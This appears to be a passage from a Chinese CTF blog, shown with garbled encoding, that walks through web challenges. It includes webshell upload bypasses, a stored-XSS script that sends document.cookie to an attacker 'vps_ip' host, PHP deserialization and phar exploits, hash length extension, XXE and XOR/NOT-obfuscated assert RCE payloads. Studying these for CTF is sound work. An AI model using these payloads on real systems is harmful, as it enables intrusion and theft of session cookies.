<h2 id="Hardsql"><a href="#Hardsql" class="headerlink" title="Hardsql"></a>Hardsql</h2><h2 id="ä½ æœ‰ç‰¹æ´›ä¼Šä¹ˆï¼šdGhpcyBpcyBub3QgZWFzeQ"><a href="#ä½ æœ‰ç‰¹æ´›ä¼Šä¹ˆï¼šdGhpcyBpcyBub3QgZWFzeQ" class="headerlink" title="ä½ æœ‰ç‰¹æ´›ä¼Šä¹ˆï¼šdGhpcyBpcyBub3QgZWFzeQ=="></a>ä½ æœ‰ç‰¹æ´›ä¼Šä¹ˆï¼šdGhpcyBpcyBub3QgZWFzeQ==</h2><p>ä¸Šä¼ æ­£å¸¸çš„å›¾ç‰‡</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191030232940824.png" alt="image-20191030232940824"></p>
<p>Not imageï¼</p>
<p>å°è¯•ä¿®æ”¹Content-Type</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191030233157391.png" alt="image-20191030233157391"></p>
<p>ä¸Šä¼ æˆåŠŸï¼Œä½†å¹¶æ²¡æœ‰è¿”å›æ–‡ä»¶è·¯å¾„</p>
<p>ç›²çŒœä¸€æ³¢upload</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191030233348553.png" alt="image-20191030233348553"></p>
<p>æ­£ç¡®</p>
<p>å°è¯•ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191030233555540.png" alt="image-20191030233555540"></p>
<p>å°è¯•æ”¹åç¼€</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191030233648512.png" alt="image-20191030233648512"></p>
<p>phtmlå¯ç»•è¿‡ ä½†ä¸èƒ½å‡ºç°&lt;?</p>
<p>åˆ©ç”¨  <code>&lt;script  language=&quot;php&quot;&gt;</code> ç»•è¿‡</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191030233844611.png" alt="image-20191030233844611"></p>
<p>ä¸Šä¼ æˆåŠŸ</p>
<p>èœåˆ€ è¿ä¸Š</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191030234008757.png" alt="image-20191030234008757"></p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191030234111964.png" alt="image-20191030234111964"></p>
<h2 id="Leixiaoâ€™s-blog-ä½ ä¼šç›—å·å—ï¼Ÿï¼Ÿ"><a href="#Leixiaoâ€™s-blog-ä½ ä¼šç›—å·å—ï¼Ÿï¼Ÿ" class="headerlink" title="Leixiaoâ€™s blog:  ä½ ä¼šç›—å·å—ï¼Ÿï¼Ÿ"></a>Leixiaoâ€™s blog:  ä½ ä¼šç›—å·å—ï¼Ÿï¼Ÿ</h2><p>è¿™é“é¢˜æ˜¯ç›´æ¥æ ¹æ®wpå¤ç°çš„ï¼Œå¯¹XSSæ²¡æœ‰å®æˆ˜è¿‡ï¼Œæ‰€ä»¥æ²¡å†™å‡ºæ¥ã€‚</p>
<p>XSSç¦»ä¸å¼€è¾“å…¥æ¡†ï¼Œæ‰€ä»¥BPæŠ“åŒ…ï¼Œä¿®æ”¹å„ä¸ªå‚æ•°çš„å€¼ï¼Œå‘ç°å¯†ä¿é—®é¢˜æ˜¯å¯æ§çš„ã€‚æ‰€ä»¥å°±æ„é€ ä¸€ä¸ªScriptçš„è¯­å¥ï¼Œæ’å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œä¹‹ååœ¨é‡ç½®å¯†ç é¡µé¢ï¼Œè¿™ä¸ªScriptè¯­å¥ä¼šæ’å…¥åˆ°é¡µé¢ä¸­ã€‚å¦‚æœç®¡ç†å‘˜è®¿é—®äº†è¿™ä¸ªé¡µé¢ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¾—åˆ°ç®¡ç†å‘˜çš„cookieï¼Œä»è€Œä»¥ç®¡ç†å‘˜èº«ä»½ç™»å½•ã€‚</p>
<p>å…ˆæ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼Œå¹¶å°†å¯†ä¿é—®é¢˜ä¿®æ”¹æˆScriptè¯­å¥ <code>&quot;&gt;&lt;script src=//0x12345678/1.js&gt;</code></p>
<p>1.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.location=<span class="string">'http://vps_ip/cookie'</span>+<span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191117232732259.png" alt="image-20191117232732259"></p>
<p>æˆ‘ä»¬è®¿é—®dcz123ç”¨æˆ·çš„é‡ç½®å¯†ç é¡µé¢</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191117233119467.png" alt="image-20191117233119467"></p>
<p>å‘ç°æˆåŠŸè·³è½¬äº†</p>
<p>æ¥ä¸‹æ¥æŠŠ</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://148.70.59.198:41258/forget.php?username=dcz123</span><br></pre></td></tr></table></figure>

<p>å‘ç»™report</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191117233239962.png" alt="image-20191117233239962"></p>
<p>ç®¡ç†å‘˜è®¿é—®åï¼Œå°±èƒ½åœ¨è®¿é—®æ—¥å¿—ä¸­å¾—åˆ°ç®¡ç†å‘˜çš„cookieäº†</p>
<h2 id="ååºåˆ—åŒ–1-0-socre10000æ‹¿åˆ°flag"><a href="#ååºåˆ—åŒ–1-0-socre10000æ‹¿åˆ°flag" class="headerlink" title="ååºåˆ—åŒ–1.0 : socre10000æ‹¿åˆ°flag"></a>ååºåˆ—åŒ–1.0 : socre10000æ‹¿åˆ°flag</h2><p>F12æŸ¥çœ‹æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $score = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"__destruct working"</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;score==<span class="number">10000</span>) &#123;</span><br><span class="line">            $flag = <span class="string">"******************"</span>;</span><br><span class="line">            <span class="keyword">echo</span> $flag;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$exp = $_GET[<span class="string">'exp'</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">unserialize($exp);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨ååºåˆ—åŒ–æ¼æ´ï¼Œä½¿scoreçš„å€¼æ”¹æˆ10000è·å¾—flag</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $score = <span class="number">10000</span>;</span><br><span class="line">&#125;</span><br><span class="line">    $Student = <span class="keyword">new</span> Student();</span><br><span class="line">    <span class="keyword">echo</span> serialize($Student); </span><br><span class="line">    </span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    <span class="comment">//O:7:"Student":1:&#123;s:5:"score";i:10000;&#125;</span></span><br></pre></td></tr></table></figure>

<p>payload:</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">148.70</span>.<span class="number">59.198</span>:<span class="number">42374</span>/?<span class="keyword">exp</span>=O:<span class="number">7</span>:%22Student%22:<span class="number">1</span>:&#123;<span class="keyword">s</span>:<span class="number">5</span>:%22score%22;i:<span class="number">10000</span>;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191103221650185.png" alt="image-20191103221650185"></p>
<p><a href="https://www.freebuf.com/news/172507.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 1</a></p>
<h2 id="åˆæ¥ä¸€åªçŒ«-æˆ‘å®¶çŒ«åå­—å«php"><a href="#åˆæ¥ä¸€åªçŒ«-æˆ‘å®¶çŒ«åå­—å«php" class="headerlink" title="åˆæ¥ä¸€åªçŒ«: æˆ‘å®¶çŒ«åå­—å«php"></a>åˆæ¥ä¸€åªçŒ«: æˆ‘å®¶çŒ«åå­—å«php</h2><p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191106232809806.png" alt="image-20191106232809806"></p>
<p>æ¨æµ‹åº”è¯¥å­˜åœ¨å¤‡ä»½æ–‡ä»¶ï¼Œç›²çŒœ <code>www.zip</code></p>
<p>ä¸‹è½½åè§£å‹ï¼Œindex.phpä¸­æ¥å—selectå‚æ•°å¹¶ååºåˆ—åŒ–ã€‚</p>
<p>æŸ¥çœ‹class.php</p>
<p>æ ¹æ® <code>__destruct()</code>å‡½æ•° ååºåˆ—åŒ–è¦ä½¿$username=admin,$password=100.</p>
<p>ä½†æœ‰ä¸ªé—®é¢˜è¦ç»•è¿‡ <code>__wakeup()</code> ,è¿™é‡Œå¯ä»¥åˆ©ç”¨ CVE-2016-7124æ¼æ´ï¼Œ<strong>å½“åºåˆ—åŒ–å­—ç¬¦ä¸²ä¸­è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„å€¼å¤§äºçœŸå®çš„å±æ€§ä¸ªæ•°æ—¶ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œ</strong> </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;    </span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'admin'</span>;    </span><br><span class="line">    <span class="keyword">private</span> $password = <span class="string">'100'</span>;</span><br><span class="line">&#125;</span><br><span class="line">$s=<span class="keyword">new</span> Name();</span><br><span class="line">var_dump(serialize($s));</span><br><span class="line">$payload=<span class="string">"O:4:\"Name\":3&#123;s:14:\"\000Name\000username\";s:5:\"admin\";s:14:\"\000Name\000password\";s:3:\"100\";&#125;"</span>; <span class="comment">//2-&gt;3</span></span><br><span class="line">var_dump(urlencode($payload));<span class="comment">//O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>æœ€ç»ˆpayload</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://118.25.14.40:8109/?select=O%3A4%3A%22Name%22%3A3%3A%7Bs%3A14%3A%22%00Name%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A14%3A%22%00Name%00password%22%3Bs%3A3%3A%22100%22%3B%7D</span><br></pre></td></tr></table></figure>

<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191106234145206.png" alt="image-20191106234145206"></p>
<p><a href="https://xz.aliyun.com/t/3674#toc-11" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 1</a></p>
<p><a href="https://xz.aliyun.com/t/6454#toc-18" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 2</a></p>
<h2 id="ä½ æœ‰åˆæ‹å—ï¼šä½ å˜å¿ƒäº†å—"><a href="#ä½ æœ‰åˆæ‹å—ï¼šä½ å˜å¿ƒäº†å—" class="headerlink" title="ä½ æœ‰åˆæ‹å—ï¼šä½ å˜å¿ƒäº†å—"></a>ä½ æœ‰åˆæ‹å—ï¼šä½ å˜å¿ƒäº†å—</h2><p>æ‰“å¼€é¢˜ç›®<a href="http://cxc.design/53a5734d6c99f89a/" target="_blank" rel="noopener">é“¾æ¥</a></p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191106163009923.png" alt="image-20191106163009923"></p>
<p>F12æŸ¥çœ‹æºç </p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191106163100753.png" alt="image-20191106163100753"></p>
<p>æ˜æ˜¾æ˜¯hashæ‰©å±•å­—èŠ‚æ”»å‡»</p>
<p>åˆ©ç”¨BPæŠ“åŒ…</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191106163553918.png" alt="image-20191106163553918"></p>
<p>å¾—åˆ°Heartçš„å€¼ï¼š<code>6a1ce5f4dc83320710006a786ac82c17</code></p>
<p>åˆ©ç”¨hashpumpå¾—åˆ°lover</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191106163932674.png" alt="image-20191106163932674"></p>
<p>å°†å¾—åˆ°çš„å­—ç¬¦ä¸²è¿›è¡Œurlç¼–ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;php</span><br><span class="line">$str=<span class="string">"syclover\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb8\x00\x00\x00\x00\x00\x00\x00nb"</span>;</span><br><span class="line">var_dump(urlencode($str));<span class="comment">//syclover%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%B8%00%00%00%00%00%00%00nb</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å°†Heartçš„å€¼ä¿®æ”¹æˆ<code>2399f812e1a15732dcaadef365b71c19</code> æäº¤lover</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191106164815760.png" alt="image-20191106164815760"></p>
<p>åé¢çœ‹äº†LiMçš„æ–‡ç« ï¼Œæ¯äº†ã€‚</p>
<p>åŒURLç¼–ç ç»•è¿‡ï¼Œç›´æ¥POSTæäº¤  <code>lover=syclove%2572</code> å¾—åˆ°flagã€‚</p>
<p>æ€è·¯å¤ªå±€é™äº†ã€‚ã€‚ã€‚</p>
<p><a href="https://www.freebuf.com/articles/web/31756.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 1</a></p>
<p><a href="https://www.freebuf.com/articles/database/164019.html" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 2</a></p>
<h2 id="Finalsql"><a href="#Finalsql" class="headerlink" title="Finalsql"></a>Finalsql</h2><h2 id="ä½ è¯»æ‡‚æ½‡æ–‡æ¸…çš„ç½‘ç«™äº†å—-xxe"><a href="#ä½ è¯»æ‡‚æ½‡æ–‡æ¸…çš„ç½‘ç«™äº†å—-xxe" class="headerlink" title="ä½ è¯»æ‡‚æ½‡æ–‡æ¸…çš„ç½‘ç«™äº†å— : xxe"></a>ä½ è¯»æ‡‚æ½‡æ–‡æ¸…çš„ç½‘ç«™äº†å— : xxe</h2><p>éƒ½å·²ç»æç¤ºxxeäº†</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191112171229906.png" alt="image-20191112171229906"></p>
<p>åˆ©ç”¨phpä¼ªåè®®è¯»å–æºç </p>
<p>index.phpä¸­çš„ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./config.php"</span>);</span><br><span class="line">date_default_timezone_set(<span class="string">"PRC"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">'submit'</span>]))&#123;</span><br><span class="line">    $data= $_POST[<span class="string">'data'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/flag|decode|file|zlib|input|data|http|ftp|#/i"</span>,$data))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"no!!!you cant read flag right here!"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $xml = simplexml_load_string($data,<span class="string">'SimpleXMLElement'</span>,LIBXML_NOENT);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">print</span>($xml);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å‘ç°åŒ…å«äº†configæ–‡ä»¶</p>
<p>æ¥ç€è¯»</p>
<p>config.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  $filetype;</span><br><span class="line">    <span class="keyword">public</span>  $filename;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"wake up "</span>;</span><br><span class="line">        var_dump(readfile(<span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($filetype,$filename)</span></span>&#123;</span><br><span class="line">    	$filename = $filename;</span><br><span class="line">    	$filetype = $filetype;</span><br><span class="line"></span><br><span class="line">    	<span class="keyword">if</span> (($filetype!=<span class="string">"image/jpg"</span>)&amp;&amp;(substr($filename, strrpos($filename, <span class="string">'.'</span>)+<span class="number">1</span>))!= <span class="string">'jpg'</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"åªå…è®¸ä¸Šä¼ jpgæ ¼å¼æ–‡ä»¶"</span>;</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($filetemp)</span></span>&#123;</span><br><span class="line">    $target_file=getcwd().<span class="string">"/uploads/"</span>.md5($filetemp+$_SERVER[<span class="string">'HTTP_REFERER'</span>]).<span class="string">".jpg"</span>;</span><br><span class="line">    $handle = fopen($filetemp, <span class="string">"r"</span>);</span><br><span class="line">    $content = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">while</span>(!feof($handle))&#123;</span><br><span class="line">        $content .= fread($handle, <span class="number">8080</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/xml|#|SYSTEM|DOCTYPE|fliter|uploads|www/i"</span>,$content))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Invalid file!!!!"</span>;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">    fclose($handle);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($filetemp, $target_file)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"your file is here:"</span>.$target_file;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½†index.phpå¹¶æ²¡æœ‰æŠŠFileç±»å®ä¾‹åŒ–ã€‚Fileç±»ä¸­æœ‰ä¸Šä¼ åŠŸèƒ½çš„å‡½æ•°ï¼Œå°±çŒœäº†ä¸‹upload.php ã€‚è¿˜çœŸæœ‰ã€‚ã€‚ã€‚</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191112234259635.png" alt="image-20191112234259635"></p>
<p>è¯»å–upload.phpçš„æºç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"></span><br><span class="line">$filename = $_FILES[<span class="string">"file"</span>][<span class="string">"name"</span>];</span><br><span class="line">$filetype = $_FILES[<span class="string">"file"</span>][<span class="string">"type"</span>];</span><br><span class="line">$filetemp = $_FILES[<span class="string">"file"</span>][<span class="string">"tmp_name"</span>];</span><br><span class="line"></span><br><span class="line">$file = <span class="keyword">new</span> File();</span><br><span class="line">$file-&gt;check($filetype,$filename);</span><br><span class="line">$file-&gt;upload($filetemp);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¹¶æ²¡æœ‰ <code>unserialize()</code>å‡½æ•°ï¼Œä½†æ ¹æ®æºç ï¼Œè¦è§¦å‘ <code>__wakeup()</code>å‡½æ•°æ‰èƒ½å¾—åˆ°flag</p>
<p>è¿™é‡Œå¯ä»¥åˆ©ç”¨<code>phar://</code>åè®®ï¼Œè§¦å‘ååºåˆ—</p>
<p>exp.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"config.php"</span>);</span><br><span class="line"><span class="comment">//ç”Ÿæˆå¯¹åº”å¯è¢«åˆ©ç”¨çš„å¯¹è±¡</span></span><br><span class="line">    $o = <span class="keyword">new</span> File();</span><br><span class="line">    @unlink(<span class="string">"phar.jpg"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.jpg"</span>);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"JFIF"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//è®¾ç½®stubï¼Œå¢åŠ jpgæ–‡ä»¶å¤´ç”¨ä»¥æ¬ºéª—æ£€æµ‹</span></span><br><span class="line">    $phar-&gt;setMetadata($o); <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶  text.txtå†…å®¹éšæ„</span></span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å°†æ–‡ä»¶ä¸Šä¼ </p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191114132547110.png" alt="image-20191114132547110"></p>
<p>åˆ©ç”¨<code>phar://</code>åè®®è§¦å‘åºåˆ—åŒ–</p>
<p><img src="/2019/10/ç¬¬åå±Šæå®¢å¤§æŒ‘æˆ˜Writeup/image-20191114132652219.png" alt="image-20191114132652219"></p>
<p>è§£ç å¾—åˆ°flag</p>
<p><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 1</a></p>
<p><a href="https://xz.aliyun.com/t/3336" target="_blank" rel="noopener">å‚è€ƒæ–‡ç« 2</a></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬å››å±Šç¬¬äº”ç©ºé—´å®‰å…¨å¤§èµ›</title>
    <url>/2020/06/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="1-hate-php"><a href="#1-hate-php" class="headerlink" title="1.hate-php"></a>1.<strong>hate-php</strong></h3><p>æºç </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $code = $_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/(f|l|a|g|\.|p|h|\/|;|\"|\'|\`|\||\[|\]|\_|=)/i'</span>,$code)) &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'You are too good for me'</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = get_defined_functions()[<span class="string">'internal'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123; </span><br><span class="line">        <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blackitem . <span class="string">'/im'</span>, $code)) &#123; </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'You deserve better'</span>); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">    assert($code);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a id="more"></a>


<p>ç¦ç”¨äº† <code>=</code> æ‰€ä»¥ä¼ªåè®® æ‹¼æ¥å­—ç¬¦ä¸² ç­‰æ–¹æ³•ç”¨ä¸äº†</p>
<p>ä½† å–åå’Œå¼‚æˆ–æ²¡è¢«ç¦ç”¨</p>
<p>å–åpayload:</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">code=(~<span class="symbol">%8</span>C<span class="symbol">%86</span><span class="symbol">%8</span>C<span class="symbol">%8</span>B<span class="symbol">%9</span>A<span class="symbol">%92</span>)(~<span class="symbol">%9</span>C<span class="symbol">%9</span>E<span class="symbol">%8</span>B<span class="symbol">%DF</span><span class="symbol">%99</span><span class="symbol">%93</span><span class="symbol">%9</span>E<span class="symbol">%98</span><span class="symbol">%D1</span><span class="symbol">%8</span>F<span class="symbol">%97</span><span class="symbol">%8</span>F)</span><br></pre></td></tr></table></figure>

<p> å¼‚æˆ–payload</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">code=(<span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span>^<span class="symbol">%D3</span><span class="symbol">%D9</span><span class="symbol">%D3</span><span class="symbol">%D4</span><span class="symbol">%C5</span><span class="symbol">%CD</span>)(<span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span><span class="symbol">%A0</span>^<span class="symbol">%C3</span><span class="symbol">%C1</span><span class="symbol">%D4</span><span class="symbol">%80</span><span class="symbol">%C6</span><span class="symbol">%CC</span><span class="symbol">%C1</span><span class="symbol">%C7</span><span class="symbol">%8</span>E<span class="symbol">%D0</span><span class="symbol">%C8</span><span class="symbol">%D0</span>)</span><br></pre></td></tr></table></figure>

<p><a href="http://0xcreed.jxustctf.top/2019/10/%E7%AC%AC%E5%8D%81%E5%B1%8A%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98Write-up/#RCE-me-I-don%E2%80%99t-think-U-can-system-RCE-prove-to-me">å¼‚æˆ–æ„é€ è„šæœ¬</a></p>
<h3 id="2-do-you-know"><a href="#2-do-you-know" class="headerlink" title="2.do you know"></a>2.do you know</h3><p>index.php</p>
